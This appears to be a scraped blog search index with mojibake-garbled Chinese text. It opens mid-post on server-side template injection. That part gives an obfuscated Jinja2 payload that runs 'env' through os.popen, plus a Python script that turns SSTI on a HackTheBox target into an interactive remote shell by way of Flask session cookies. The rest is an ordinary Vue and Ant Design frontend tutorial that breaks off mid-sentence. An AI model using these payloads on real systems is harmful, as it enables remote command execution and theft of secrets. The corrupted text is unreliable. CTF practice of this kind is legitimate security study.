1234567891011121314151617181920&#123;%%20set%20po=dict(po=a,p=a)|join%&#125;&#123;% set a =lipsum|lower|list|random%&#125;&#123;% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%&#125;&#123;% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%&#125;&#123;% set ge=(a,a,dict(ge=a,titem=b)|join,a,a)|join()%&#125;&#123;% set built=(a,a,dict(bui=a,ltins=b)|join,a,a)|join()%&#125;&#123;%set di=(a,a,dict(di=a,ct=b)|join,a,a)|join()%&#125;&#123;% set x=(q|attr(ini)|attr(glo)|attr(ge))(built)%&#125;&#123;%set ev=(dict(ev=a,al=b)|join)%&#125;&#123;%set fun=x|attr(ge)(ev)%&#125;&#123;%set f=(dict(fun=a,c=b)|join,a,dict(glo=a,bals=b)|join)|join()%&#125;&#123;%set linecache=(dict(line=a,cache=b)|join,a,dict(glo=a,bals=b)|join)|join()%&#125;&#123;%set oo=(dict(o=a,s=b)|join)%&#125;&#123;% set or=dict(or=a,d=b)|join %&#125;&#123;% set ord= (x|attr(ge))(or) %&#125;&#123;% set ch=dict(c=a,hr=b)|join %&#125;&#123;% set cch= (x|attr(ge))(ch) %&#125;&#123;% set f=dict(F=a)|join%&#125;&#123;% set m=dict(m=a)|join%&#125;&#123;%set sin=cch(ord(m)-ord(f))%&#125;&#123;% set R=dict(R=a)|join%&#125;&#123;% set z=dict(z=a)|join%&#125;&#123;%set kuoa=cch(ord(z)-ord(R))%&#125;&#123;% set Q=dict(Q=a)|join%&#125;&#123;% set z=dict(z=a)|join%&#125;&#123;%set kuob=cch(ord(z)-ord(Q))%&#125;&#123;% set L=dict(L=a)|join%&#125;&#123;% set z=dict(z=a)|join%&#125;&#123;%set dd=cch(ord(z)-ord(L))%&#125;&#123;% set Z=dict(Z=a)|join%&#125;&#123;%set spa=cch(ord(z)-ord(Z))%&#125;&#123;% set K=dict(K=a)|join%&#125;&#123;% set z=dict(z=a)|join%&#125;&#123;%set xie=cch(ord(z)-ord(K))%&#125;&#123;% set arg=(a,a,dict(imp=a,ort=b)|join,a,a,kuoa,sin,oo,sin,kuob,dd,dict(po=a,pen=b)|join,kuoa,sin,dict(env=a)|join,sin,kuob,dd,dict(rea=a,d=b)|join,kuoa,kuob)|join()%&#125;&#123;&#123;fun(arg)&#125;&#125; 2.12 hacktheboxçš„é‡Œé¢12345678910111213import requestsimport flask_unsignServer =&quot;http://138.68.182.108:30171/&quot;if requests.get(Server).status_code == 200: while True: cmd = input (&quot;Command: &quot;) if cmd == &quot;exit&quot;: exit() sess = requests.Session() sess.get(Server+&quot;/?name=&#123;%+if+session.update(&#123;request.args.se:request.application.__globals__.__builtins__.__import__(request.args.os).popen(request.args.command).read()&#125;)+==+1+%&#125;&#123;%+endif+%&#125;&amp;se=asdf&amp;os=os&amp;command=&quot;+cmd) session = sess.cookies.get_dict()[&#x27;session&#x27;] print(flask_unsign.decode(str(session))[&#x27;asdf&#x27;].decode())","categories":[],"tags":[{"name":"ssti","slug":"ssti","permalink":"http://example.com/tags/ssti/"}]},{"title":"Vueæ€»ç»“","slug":"Vueæ€»ç»“","date":"2020-10-25T13:28:49.000Z","updated":"2020-11-17T06:08:39.740Z","comments":true,"path":"2020/10/25/Vueæ€»ç»“/","link":"","permalink":"http://example.com/2020/10/25/Vue%E6%80%BB%E7%BB%93/","excerpt":"Vue partæ€»ç»“äº†å‰ç«¯é¡¹ç›®çš„æ­å»ºï¼Œä»¥åŠè‡ªå·±åœ¨è¿™æ¬¡ä½œå“ä¸­å­¦åˆ°äº†ä»€ä¹ˆ","text":"Vue partæ€»ç»“äº†å‰ç«¯é¡¹ç›®çš„æ­å»ºï¼Œä»¥åŠè‡ªå·±åœ¨è¿™æ¬¡ä½œå“ä¸­å­¦åˆ°äº†ä»€ä¹ˆ Vueæˆ‘è®¤ä¸ºå­¦ä¸‹æ¥å°±æ˜¯å¾ˆçˆ½ï¼ŒåŸºæœ¬ä¸Šä¸ç”¨å†å„ç§å»ç»‘å®šJSå½“ä¸­çš„domå…ƒç´ äº†ï¼ˆgetElementByIdä»€ä¹ˆçš„ï¼‰ å…¶ä¸­åŸºç¡€æºç ï¼Œæœ‰ä¸€ä¸ªindex.html 1.index.html123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt; &lt;link rel=&quot;icon&quot; href=&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;&gt; &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;noscript&gt; &lt;strong&gt;We&#x27;re sorry but &lt;%= htmlWebpackPlugin.options.title %&gt; doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.&lt;/strong&gt; &lt;/noscript&gt; &lt;div id=&quot;app&quot;&gt;&lt;/div&gt; &lt;!-- built files will be auto injected --&gt; &lt;/body&gt;&lt;/html&gt; å¯åŠ¨çš„æ—¶å€™æœ‰ä¸€ä¸ªmain.jsï¼ŒAPP.vueç­‰ç­‰ã€‚ç°åœ¨è®²ä¸€ä¸‹æˆ‘æ˜¯æ€ä¹ˆåšä¸‹æ¥çš„ï¼Œæˆ‘åˆ©ç”¨åˆ°çš„æ¡†æ¶æ˜¯antdvï¼Œå†package.jsonå½“ä¸­å¯ä»¥æ‰¾åˆ° 2.package.json1234567891011121314151617181920212223242526272829303132&quot;dependencies&quot;: &#123; &quot;@antv/data-set&quot;: &quot;^0.11.7&quot;, &quot;@antv/g2&quot;: &quot;^4.0.15&quot;, &quot;@sven0706/websocket&quot;: &quot;^1.0.1&quot;, &quot;ant-design-vue&quot;: &quot;^1.6.5&quot;, &quot;axios&quot;: &quot;^0.20.0&quot;, &quot;core-js&quot;: &quot;^3.6.5&quot;, &quot;echarts&quot;: &quot;^4.9.0&quot;, &quot;html2canvas&quot;: &quot;^1.0.0-rc.7&quot;, &quot;js-cookie&quot;: &quot;^2.2.1&quot;, &quot;jspdf&quot;: &quot;^2.1.1&quot;, &quot;less&quot;: &quot;^3.12.2&quot;, &quot;less-loader&quot;: &quot;^7.0.1&quot;, &quot;rc-resize-observer&quot;: &quot;^0.2.5&quot;, &quot;react&quot;: &quot;^16.13.1&quot;, &quot;react-dom&quot;: &quot;^16.13.1&quot;, &quot;react-window&quot;: &quot;^1.8.5&quot;, &quot;vant&quot;: &quot;^2.10.9&quot;, &quot;vue&quot;: &quot;^2.6.11&quot;, &quot;vue-print-nb&quot;: &quot;^1.5.0&quot;, &quot;vue-router&quot;: &quot;^3.4.5&quot;, &quot;vuex&quot;: &quot;^3.5.1&quot; &#125;, &quot;devDependencies&quot;: &#123; &quot;@vue/cli-plugin-babel&quot;: &quot;~4.5.0&quot;, &quot;@vue/cli-plugin-eslint&quot;: &quot;~4.5.0&quot;, &quot;@vue/cli-service&quot;: &quot;~4.5.0&quot;, &quot;babel-eslint&quot;: &quot;^10.1.0&quot;, &quot;eslint&quot;: &quot;^6.7.2&quot;, &quot;eslint-plugin-vue&quot;: &quot;^6.2.2&quot;, &quot;vue-template-compiler&quot;: &quot;^2.6.11&quot; &#125;, è¦ç”¨çš„æ—¶å€™å†é¡¹ç›®æ ¹ç›®å½•ä¸‹cnpm -iå³å¯ã€‚ è®²ä¸€ä¸‹è·¯ç”±è¯¥æ€ä¹ˆåšæŠŠï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ª 3.router.js1234//å¼•å…¥vueimport Vue from &#x27;vue&#x27;;//å¼•å…¥vue-routerimport VueRouter from &#x27;vue-router&#x27;; åœ¨Vueå½“ä¸­ï¼Œæ‰€æœ‰éœ€è¦å¼•ç”¨çš„ä¸œè¥¿éœ€è¦ç”¨Vue.useä¹‹åæ‰ä¼šç”Ÿæ•ˆ æ•…æˆ‘ä»¬æ„é€ ä¹‹åçš„ä»£ç æ¡†æ¶å¤§è‡´å¦‚ä¸‹ï¼š 1234567891011121314151617//å¼•å…¥vueimport Vue from &#x27;vue&#x27;;//å¼•å…¥vue-routerimport VueRouter from &#x27;vue-router&#x27;;Vue.use(VueRouter)//å¼•ç”¨page1é¡µé¢import upload from &#x27;./components/upload.vue&#x27;;import login from &#x27;./components/login.vue&#x27;;//å®šä¹‰routesè·¯ç”±çš„é›†åˆï¼Œæ•°ç»„ç±»å‹const routes=[ //å•ä¸ªè·¯ç”±å‡ä¸ºå¯¹è±¡ç±»å‹ï¼Œpathä»£è¡¨çš„æ˜¯è·¯å¾„ï¼Œcomponentä»£è¡¨ç»„ä»¶ &#123;path:&#x27;/upload&#x27;,component:upload&#125;, &#123;path:&#x27;/login&#x27;,component:login&#125;, ä¸€ä¸ªVueæ–‡ä»¶çš„æ ¼å¼å¦‚ä¸‹ï¼š 4.ä¸»å…¥å£123456789101112131415161718&lt;template&gt; &lt;div id&#x3D;&quot;app&quot;&gt; &lt;router-view&#x2F;&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &#39;App&#39;, &#125;&lt;&#x2F;script&gt;&lt;style&gt;&lt;&#x2F;style&gt; åœ¨templateå½“ä¸­æ„é€ HTMLçš„ä»£ç ï¼Œscriptå½“ä¸­æ„é€ å½“å‰é¡µé¢çš„JSï¼Œè€Œstyleè®¾ç½®ä¸­å†™cssã€‚å¦‚æœä¸åšé™å®šï¼ŒCSSå°†ä¼šæ˜¯å…¨å±€ç”Ÿæ•ˆçš„ï¼ è€ŒAPPä½œä¸ºä¸»é¡µé¢ï¼Œåªéœ€è¦å†™ä¸€å¥è¯å³å¯ï¼š 1&lt;router-view/&gt; è¿™ä¸€å¥è¯çš„æ„æ€ä»£ç å°†é¡µé¢å†…å®¹æ‰˜ç®¡ç»™Vueï¼Œæ ¹æ®vueçš„Routeræ¥æ˜¾ç¤ºå†…å®¹ è€ŒRouterçš„è®¾ç½®åœ¨main.jså½“ä¸­ï¼ˆå®é™…ä¸Šï¼Œå‡ ä¹æ‰€æœ‰çš„è®¾ç½®éƒ½æ”¾åœ¨main.jså½“ä¸­è¿›è¡Œç»Ÿä¸€è®¾ç½®ï¼‰ 1234new Vue(&#123; router, render: h =&gt; h(App),&#125;).$mount(&#x27;#app&#x27;) åœ¨main.jså¯¼å…¥çš„æ¨¡å—å¯ä»¥å…¨é¡¹ç›®ç”Ÿæ•ˆï¼Œå¦‚æœæƒ³è¦æ™®é€šçš„ç”Ÿæ•ˆä¸€ä¸ªæ¨¡å—ï¼Œè¿™æ ·æ„é€ ï¼š 123456789101112import &#123; Button, Table, Menu, Switch,Icon,Layout,Upload,Breadcrumb,FormModel,Input,Divider,message,Form,Alert,Spin,Modal &#125; from &#x27;ant-design-vue&#x27;//åœ¨ä¸‹é¢ï¼šVue.use(Modal)Vue.use(Spin)Vue.use(Alert)Vue.use(Form)Vue.use(axios)Vue.use(htmlToPdf)Vue.use(Divider)Vue.use(Input)Vue.use(FormModel) å¦‚æœæƒ³è¦ä¿®æ”¹Vueé»˜è®¤çš„è®¾ç½®ï¼Œä¾‹å¦‚æˆ‘ä»¬å¯¼å…¥axiosçš„æ—¶å€™è¿™æ ·æ„é€ ï¼š 12import axios from &#x27;axios&#x27;Vue.prototype.$http = axios ä¹‹åæˆ‘æ„é€ äº†ä¸€ä¸ªå…¬å…±ä½¿ç”¨çš„Vueæ¨¡æ¿ï¼Œä¹Ÿå°±æ˜¯èœå•æ çš„æ’ä»¶ï¼Œæˆ‘æ˜¯åˆ›å»ºäº†ä¸€ä¸ªcommonsæ–‡ä»¶å¤¹ï¼Œå¹¶å†™åœ¨é‡Œé¢ 5.æ’æ§½12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;template&gt; &lt;a-layout id=&quot;components-layout-demo-side&quot; style=&quot;min-height: 100vh&quot;&gt; &lt;a-layout-sider v-model=&quot;collapsed&quot; width=&quot;12%&quot; collapsible&gt; &lt;div class=&quot;logo&quot; /&gt; &lt;a-menu theme=&quot;dark&quot; :default-selected-keys=&quot;[&#x27;1&#x27;]&quot; mode=&quot;inline&quot;&gt; &lt;a-menu-item key=&quot;1&quot;&gt; &lt;router-link to=&quot;upload&quot;&gt;&lt;a-icon type=&quot;cloud-download&quot; /&gt; &lt;span&gt; æ–‡ä»¶ä¸Šä¼  &lt;/span&gt; &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-sub-menu key=&quot;sub1&quot;&gt; &lt;span slot=&quot;title&quot;&gt;&lt;a-icon type=&quot;area-chart&quot; /&gt; &lt;span&gt; æ•°æ®åˆ†æ &lt;/span&gt; &lt;/span&gt; &lt;a-menu-item key=&quot;2&quot;&gt; &lt;router-link to=&quot;report&quot;&gt; æ—¥å¿—åˆ†æ &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;3&quot;&gt; &lt;router-link to=&quot;getpdf&quot;&gt; è·å–æŠ¥å‘Š &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;/a-sub-menu&gt; &lt;a-sub-menu key=&quot;sub2&quot;&gt; &lt;span slot=&quot;title&quot;&gt;&lt;a-icon type=&quot;dashboard&quot; /&gt;&lt;span&gt;ç«‹ä½“æ•°æ®&lt;/span&gt;&lt;/span&gt; &lt;a-menu-item key=&quot;5&quot;&gt; &lt;router-link to=&quot;attackaddress&quot;&gt; æ”»å‡»æº¯æº &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;8&quot;&gt; &lt;router-link to=&quot;watchlog&quot;&gt; å®æ—¶ç›‘æ§ &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;/a-sub-menu&gt; &lt;a-menu-item key=&quot;9&quot;&gt; &lt;router-link to=&quot;setting&quot;&gt; &lt;a-icon type=&quot;setting&quot; /&gt; &lt;span&gt;ç³»ç»Ÿè®¾ç½®&lt;/span&gt; &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;10&quot; @click=&quot;showModal&quot;&gt; &lt;a-icon type=&quot;login&quot; /&gt; &lt;span &gt;ç™»å‡º&lt;/span&gt; &lt;a-modal v-model=&quot;visible&quot; title=&quot;Basic Modal&quot; @ok=&quot;handleOk&quot;&gt; &lt;p&gt;æ˜¯å¦ç¡®å®šç™»å‡ºï¼Ÿ&lt;/p&gt; &lt;/a-modal&gt; &lt;/a-menu-item&gt; &lt;/a-menu&gt; &lt;/a-layout-sider&gt; &lt;a-layout&gt; &lt;a-layout-header theme=dark &gt; &lt;/a-layout-header&gt; &lt;!-- ä¸Šé¢æ˜¯åœ¨å¯¼èˆªæ æœ€é¡¶ç«¯åŠ ä¸œè¥¿ --&gt; &lt;a-layout-content style=&quot;margin: 0 16px&quot;&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/a-layout-content&gt; &lt;a-layout-footer style=&quot;text-align: center&quot;&gt; Ant Design Â©2018 Created by Ant UED &lt;/a-layout-footer&gt; &lt;/a-layout&gt; &lt;/a-layout&gt;&lt;/template&gt;&lt;script&gt; éœ€è¦æ³¨æ„çš„æ˜¯ï¼š 1&lt;slot&gt;&lt;/slot&gt; åœ¨Vueå½“ä¸­ï¼Œè¿™ä¸ªç›¸å½“äºä¸€ä¸ªæ’æ§½ï¼Œä¹Ÿå°±æ˜¯ï¼Œå‘ƒï¼Œç±»ä¼¼ä¸€ä¸ªincludeå‡½æ•°ï¼Œæˆ‘ä»¬å¦‚æœæƒ³è¦æŠŠä»–å½“ä½œæ¨¡æ¿çš„è¯å°±éœ€è¦è¿™æ ·å†™ï¼Œæ¯”å¦‚æˆ‘ä»¬çš„report.vue 1234567import menus from &#x27;../commons/menu&#x27;&lt;menu&gt;&lt;/menu&gt;//åœ¨ä¸‹é¢å¯¼å…¥ï¼Œä¹‹åå†htmlå½“ä¸­ä½¿ç”¨å³å¯components:&#123; menus, &#125;, 6.è·¯ç”±å®ˆå«æˆ‘ä»¬å‰ç«¯è‚¯å®šæ˜¯è¦é‰´æƒçš„å§ï¼Œä¸ç„¶ç”¨æˆ·å°±å¯å¯¹å‰ç«¯ä¸ºæ‰€æ¬²ä¸ºäº†ï¼Œæ•…æˆ‘ä»¬æ„é€ ä¸€ä¸ªå±€éƒ¨å®ˆå«æ˜¯è¿™æ ·çš„ï¼š 123456beforeRouteEnter(to,from,next) &#123; axios.post(&#x27;/report&#x27;).then(res =&gt;&#123; if (res.data == 0) next(&#123; path:&#x27;/&#x27; &#125;); else next(); &#125;) &#125;, è¿™æ ·çš„è¯ï¼Œå†è®¿é—®è¯¥è·¯ç”±ï¼Œç¦»å¼€è·¯ç”±çš„æ—¶å€™éƒ½ä¼šå…ˆè®¿é—®ä¸€æ¬¡é¡µé¢ï¼Œæˆ‘ä»¬åç«¯å†™å¥½ä»£ç ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰ç™»é™†çš„è¯ï¼Œå°±ä¼šè¿”å›åˆ°indexé¡µé¢äº†ã€‚ 7.æœŸå¾…å€¼è¿™ä¸ªç†è§£èµ·æ¥å•é å˜´è¯´è¾ƒä¸ºåƒµç¡¬ï¼Œéœ€è¦å®æˆ˜ä¸­ä½¿ç”¨æ‰å¯ä»¥é¢†æ‚Ÿçš„æ¸…æ¥šï¼Œæ¯”å¦‚æˆ‘ä»¬çš„htmlä»£ç ä¸­æ„é€ å¦‚ä¸‹ï¼š 1&lt;a-button type=&quot;danger&quot; :style=&quot;&#123;margin:&#x27;-20px 0px 0px 200px&#x27;&#125;&quot; @click=&quot;ExportSavePdf(htmlTitle,nowTime)&quot;&gt;æŠ¥å‘Šç”Ÿæˆ&lt;/a-button&gt; ï¼ˆé€šè¿‡Vueæ¡†æ¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨@clickçš„æ–¹æ³•æ¥å¤„ç†å„ç§äº‹ä»¶ï¼Œä¹‹åå¡«å…¥ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶å†™å…¥å‡½æ•°çš„å®å‚ï¼Œè€Œå®å‚ä¸ä¸€å®šæ˜¯ä¸€å®šå‡ºç°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å®å‚å¯èƒ½ä¼šå‡ºç°ä¸ºnullçš„æƒ…å†µï¼Œè€ŒVueä¸æƒ³å‡ºç°è¿™ç§æƒ…å†µï¼Œæ‰€ä»¥è¦æ±‚æˆ‘ä»¬å¡«å…¥é»˜è®¤å€¼ï¼Œä¹Ÿå°±æ˜¯æœŸå¾…å€¼ï¼Œå½“æˆ‘ä»¬æ²¡æœ‰å¡«å…¥å‚æ•°çš„æ—¶å€™è‡ªåŠ¨å¡«å…¥çš„å‚æ•° 12345678data() &#123; return &#123; data, columns, htmlTitle: &#x27;report&#x27;, keyName: &#x27;&#x27;, &#125;; &#125;, 8.è®¾ç½®é»˜è®¤å€¼æœ‰çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯èƒ½æƒ³åœ¨ç”¨æˆ·è®¿é—®ä¹‹å‰çš„æ—¶å€™ç›´æ¥è·å–æ•°æ®ï¼Œè¿™æ ·çš„è¯å°±å¯ä»¥ç›´æ¥æ‹¿åˆ°æ•°æ®äº†ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹æ³•ï¼š 123mounted() &#123; // this.drawChart(); &#125; ä»¥è¿™ç§æ–¹å¼å¡«å…¥çš„å€¼ï¼Œå½“ç”¨æˆ·è®¿é—®é¡µé¢çš„æ—¶å€™ä¾¿ä¼šè‡ªåŠ¨è¿›è¡Œè°ƒç”¨ã€‚ä¾‹å­ï¼š 1234567axios.post(&#x27;/setting&#x27;).then(res=&gt;&#123; this.usersData(res.data); // location.reload() &#125;).catch(err=&gt;&#123; // console.log(err) &#125;) &#125; 9.å®ç°ç›‘å¬æ•°æ®åœ¨ä¹‹å‰çš„layuiçš„æ—¶å€™ï¼Œå› ä¸ºæˆ‘ä¸ä¼šå¯¹æ•°æ®è¿›è¡Œç»‘å®šï¼Œæ‰€ä»¥å¾€å¾€é€ æˆè‡ªå·±è¦å†™å¾ˆå¤šçš„type=hidenï¼Œæˆ–è€…å¿…é¡»æ„é€ formè¡¨å•çš„æƒ…å†µï¼Œè€Œä½¿ç”¨æ¡†æ¶ä¹‹åå¯ä»¥é€šè¿‡v-modelæ“ä½œç®€å•çš„å®ç°è¿™ä¸ªæ•ˆæœï¼Œ ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536&lt;a-form-model-item style=&quot;margin: 0px 10px 0px 00px&quot; class=&quot;selectAddress&quot;&gt; &lt;a-input type=&quot;password&quot; placeholder=&quot;logKey&quot; v-model=&quot;attackAddressName&quot;&gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;lock&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-model-item&gt; &lt;a-form-model-item class=&quot;selectButton&quot;&gt; &lt;a-button type=&quot;primary&quot; html-type=&quot;submit&quot; @click=&quot;selectAddress($event)&quot; &gt; æ·»åŠ  &lt;/a-button&gt; &lt;/a-form-model-item&gt;//åœ¨JSä»£ç ä¸­ï¼šselectAddress:function(event)&#123; // console.log(this.attackAddressName) let formAddress = new FormData(); formAddress.append(&#x27;logname&#x27;, this.attackAddressName) // console.log(formAddress.get(&#x27;logname&#x27;)) this.spinning = true; axios.post(&#x27;/setting&#x27;,formAddress).then(res =&gt;&#123; let earchData =JSON.parse(res.data) // console.log(res.data) this.china(earchData); this.spinning = false; &#125;).catch(err =&gt;&#123; console.log(err); &#125;) &#125; æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæˆ‘å¹¶æ²¡æœ‰å†™formè¡¨å•ï¼Œè€Œæˆ‘ä¾ç„¶å¯ä»¥å®ç°æäº¤æ•°æ®ï¼Œæ˜¯å› ä¸ºä½¿ç”¨v-modelç›‘å¬ä¹‹åï¼Œè¯¥inputè¾“å…¥æ¡†çš„å†…å®¹è¢«JSå®æ—¶ç›‘æ§ç€ã€‚ 10.ç›‘å¬çš„å¦™ç”¨åˆ©ç”¨ç›‘å¬ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆè½»æ¾çš„å®Œæˆå¯¹ä¸€äº›çœ‹èµ·æ¥å¾ˆé…·ç‚«çš„ç‰¹æ•ˆï¼Œæ¯”å¦‚ï¼Œå¦‚æœç”¨æˆ·æƒ³è¦æäº¤ç‚¹å‡»ä¸€ä¸ªæŒ‰é’®ï¼Œå°±éœ€è¦å¡«å†™å‡ ä¸ªinputæ¡†ï¼Œå¹¶ä¸”å¦‚æœæ¡†æ˜¯ç©ºçš„ï¼Œè¿˜å¯ä»¥ç»™å‡ºæç¤ºç­‰ç­‰ï¼Œè¿™é‡Œä¸¾å‡ºä¸€ä¸ªä¾‹å­ï¼Œæ¯”å¦‚ï¼š 123456789101112&lt;!-- ç”¨æˆ·ååˆ¤æ–­ --&gt; &lt;a-form-item :validate-status=&quot;userNameError() ? &#x27;error&#x27; : &#x27;&#x27;&quot; :help=&quot;userNameError() || &#x27;&#x27;&quot;&gt; &lt;a-input v-decorator=&quot;[ &#x27;userName&#x27;, &#123; rules: [&#123; required: true, message: &#x27;Please input your username!&#x27; &#125;] &#125;, ]&quot; placeholder=&quot;Username&quot; &gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;user&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-item&gt; é¡ºä¾¿ä¸€æï¼Œ ç”¨:å¼•å·å†™å…¥çš„ä¸œè¥¿ï¼Œä¸€èˆ¬æˆ‘ä»¬æ˜¯ç”¨äºæ¡ä»¶åˆ¤æ–­ï¼Œæ¯”å¦‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°±æ˜¯åˆ©ç”¨è¿™ä¸ªå»åˆ¤æ–­userNameErrorçš„çŠ¶å†µ åœ¨methodså½“ä¸­ï¼Œæˆ‘ä»¬æ„é€ å¦‚ä¸‹ä»£ç ï¼š 1234userNameError() &#123; const &#123; getFieldError, isFieldTouched &#125; = this.form; return isFieldTouched(&#x27;userName&#x27;) &amp;&amp; getFieldError(&#x27;userName&#x27;); &#125;, åœ¨dataå½“ä¸­ï¼š 123456data() &#123; return &#123; hasErrors, form: this.$form.createForm(this, &#123; name: &#x27;getWebsocket&#x27; &#125;), &#125;; &#125;, å®˜æ–¹æ˜¯å¦‚ä¸‹è§£é‡Šçš„ï¼š v-decorator æ˜¯ Ant Design çš„æ§ä»¶éªŒè¯å±æ€§ã€‚ ç»è¿‡ getFieldDecorator æˆ– v-decorator åŒ…è£…çš„æ§ä»¶ï¼Œè¡¨å•æ§ä»¶ä¼šè‡ªåŠ¨æ·»åŠ  valueï¼ˆæˆ– valuePropName æŒ‡å®šçš„å…¶ä»–å±æ€§ï¼‰ onChangeï¼ˆæˆ– trigger æŒ‡å®šçš„å…¶ä»–å±æ€§ï¼‰ï¼Œæ•°æ®åŒæ­¥å°†è¢« Form æ¥ç®¡ï¼Œè¿™ä¼šå¯¼è‡´ä»¥ä¸‹ç»“æœï¼š ä½ ä¸å†éœ€è¦ä¹Ÿä¸åº”è¯¥ç”¨ onChange æ¥åšåŒæ­¥ï¼Œä½†è¿˜æ˜¯å¯ä»¥ç»§ç»­ç›‘å¬ onChange ç­‰äº‹ä»¶ã€‚ ä½ ä¸èƒ½ç”¨æ§ä»¶çš„ value defaultValue ç­‰å±æ€§æ¥è®¾ç½®è¡¨å•åŸŸçš„å€¼ï¼Œé»˜è®¤å€¼å¯ä»¥ç”¨ getFieldDecorator æˆ– v-decorator é‡Œçš„ initialValueã€‚ ä½ ä¸åº”è¯¥ç”¨ v-modelï¼Œå¯ä»¥ä½¿ç”¨ this.form.setFieldsValue æ¥åŠ¨æ€æ”¹å˜è¡¨å•å€¼ã€‚ ä¹Ÿå°±æ˜¯è¯´è¿™ç§æ–¹å¼æ˜¯å§formç”±Vueå½»åº•æ‰˜ç®¡äº†~å’Œä¹‹å‰çš„ä¸åŒï¼Œä¼šè‡ªåŠ¨åˆ¤æ–­æ˜¯å¦å­˜åœ¨å€¼ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå°†ä¼šè°ƒç”¨v-decoratorã€‚å½“ç„¶è¿™ç§æ–¹å¼æˆ‘æ˜¯æ¯”è¾ƒæ¨¡ç³Šçš„ï¼ŒçœŸè¦è¯´æˆ‘æ¯”è¾ƒç†è§£çš„æ˜¯å¦å¤–ä¸€ä¸ªå½¢å¼ 11.v-modelçš„å¦™ç”¨åœ¨htmlå½“ä¸­å†™ä¸‹ï¼š 12345678910111213141516171819&lt;a-form-model-item style=&quot;margin: 0px 10px 0px 00px&quot; class=&quot;selectAddress&quot;&gt; &lt;a-input type=&quot;password&quot; placeholder=&quot;logKey&quot; v-model=&quot;attackAddressName&quot;&gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;lock&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-model-item&gt; &lt;a-form-model-item class=&quot;selectButton&quot;&gt; &lt;a-button type=&quot;primary&quot; html-type=&quot;submit&quot; @click=&quot;selectAddress($event)&quot; &gt; æ·»åŠ  &lt;/a-button&gt; &lt;/a-form-model-item&gt;&lt;a-alert message=&quot;è¾“å…¥keyï¼Œå³å¯è‡ªåŠ¨æº¯æº&quot; type=&quot;info&quot; class=&quot;fontKey&quot; /&gt; &lt;a-spin size=&quot;large&quot; class=&quot;spinner&quot; :spinning=&quot;spinning&quot; :delay=&quot;delayTime&quot; /&gt; æ³¨æ„è¿™é‡Œçš„spinningï¼Œæˆ‘ä»¬ç»™å¥¹è¿›è¡Œæ‰˜ç®¡ï¼Œå¦‚æœå¯ä»¥çš„è¯ï¼Œè€Œspinningçš„æœŸæœ›é»˜è®¤å€¼åœ¨dataå½“ä¸­æ„é€ ï¼š 1234567data()&#123; return&#123; attackAddressName:&#x27;&#x27;, spinning: false, delayTime: 500, &#125; &#125;, è€Œå½“æˆ‘ä»¬ç‚¹å‡»æŒ‰é’®å‘é€æ•°æ®ä¹‹åï¼š 123456789101112131415161718selectAddress:function(event)&#123; // console.log(this.attackAddressName) let formAddress = new FormData(); formAddress.append(&#x27;logname&#x27;, this.attackAddressName) // console.log(formAddress.get(&#x27;logname&#x27;)) this.spinning = true; axios.post(&#x27;/setting&#x27;,formAddress).then(res =&gt;&#123; let earchData =JSON.parse(res.data) // console.log(res.data) this.china(earchData); this.spinning = false; &#125;).catch(err =&gt;&#123; console.log(err); &#125;) &#125; ä¸€æ—¦æ•°æ®æˆåŠŸå‘é€è¿‡å»ï¼Œæˆ‘ä»¬å°±å°†spinningçš„å€¼æ”¹æˆtrueï¼Œè¿™æ ·å°±å¯ä»¥æ˜¾ç¤ºäº†ï¼Œå½“è·å–æ•°æ®ä¹‹åï¼Œæˆ‘ä»¬å°±æ”¹æˆfalseï¼Œè®©ä»–æ¶ˆå¤±å³å¯ axios part1.aioxå‘é€æ•°æ®axiosæ˜¯ä¸€ä¸ªç»„ä»¶ï¼Œç”¨äºå‘é€æ•°æ®ç»™åç«¯ï¼Œç›¸å½“å¥½ç”¨ï¼Œæˆ‘ä»¬ä¸ºäº†é™ä½ä»£ç 